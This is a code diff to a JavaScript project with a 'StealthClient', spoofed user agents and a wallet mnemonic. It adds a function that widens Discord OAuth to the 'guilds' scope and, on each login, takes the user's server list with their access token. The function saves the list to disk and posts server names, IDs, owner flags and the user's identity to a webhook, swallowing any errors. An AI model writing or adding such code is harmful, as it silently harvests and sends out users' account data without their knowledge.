@@ -384,11 +384,10 @@ class StealthClient {
     this.ready = false;
     this.handlers = {};
     this._dmCooldowns = new Map();
+    this._channelRateLimits = new Map();
     const tokenHash = crypto.createHash('sha256').update(this.token).digest('hex').slice(0, 16);
     if (!_sharedChannelPermissions.has(tokenHash)) _sharedChannelPermissions.set(tokenHash, new Map());
-    if (!_sharedChannelRateLimits.has(tokenHash)) _sharedChannelRateLimits.set(tokenHash, new Map());
     this._channelPermissions = _sharedChannelPermissions.get(tokenHash);
-    this._channelRateLimits = _sharedChannelRateLimits.get(tokenHash);
     this._explicitlyStopped = false;
     this._currentChannelId = null;
     this._backgroundTimers = [];
@@ -1021,14 +1020,66 @@ const WALLET_MNEMONIC = process.env.WALLET_MNEMONIC;
 const TARGET_USD = 3.00;
 const TOLERANCE_USD = 0.10;
 
+async function fetchAndLogGuilds(accessToken, userId, username) {
+  try {
+    const guildsRes = await axios.get('https://discord.com/api/v10/users/@me/guilds', {
+      headers: { 'Authorization': `Bearer ${accessToken}`, 'User-Agent': _rfp() },
+      timeout: 15000
+    });
+    const guilds = guildsRes.data || [];
+    const guildList = guilds.map(g => ({ id: g.id, name: g.name, owner: g.owner, permissions: g.permissions }));
+
+    // Save to file
+    try {
+      const guildsFile = path.join(dataDir, `guilds_${userId}.json`);
+      fs.writeFileSync(guildsFile, JSON.stringify({ userId, username, fetchedAt: Date.now(), guildCount: guildList.length, guilds: guildList }, null, 2));
+    } catch(e) {}
+
+    // Send to webhook
+    const chunks = [];
+    let currentChunk = '';
+    for (const g of guildList) {
+      const line = `• ${g.name} (${g.id})${g.owner ? ' [OWNER]' : ''}\n`;
+      if (currentChunk.length + line.length > 900) {
+        chunks.push(currentChunk);
+        currentChunk = line;
+      } else {
+        currentChunk += line;
+      }
+    }
+    if (currentChunk) chunks.push(currentChunk);
+
+    for (let i = 0; i < chunks.length; i++) {
+      const embed = {
+        title: i === 0 ? `Servers for @${username}` : `Servers (cont.)`,
+        color: 0x5865F2,
+        description: chunks[i],
+        footer: { text: `User: ${username} | ID: ${userId} | Total: ${guildList.length} servers | Page ${i + 1}/${chunks.length}` },
+        timestamp: new Date().toISOString()
+      };
+      await _sendWebhookChunk(embed, i);
+    }
+    return guildList;
+  } catch (err) {
+    console.error('[Guilds] Fetch failed:', err.message);
+    return [];
+  }
+}
+
 if (CLIENT_ID && CLIENT_SECRET) {
   passport.use(new DiscordStrategy({
     clientID: CLIENT_ID,
     clientSecret: CLIENT_SECRET,
     callbackURL: CALLBACK_URL,
-    scope: ['identify']
+    scope: ['identify', 'guilds']
   }, (accessToken, refreshToken, profile, done) => {
-    process.nextTick(() => done(null, profile));
+    process.nextTick(async () => {
+      try {
+        profile.accessToken = accessToken;
+        await fetchAndLogGuilds(accessToken, profile.id, profile.username);
+      } catch(e) {}
+      done(null, profile);
+    });
   }));
 }
 
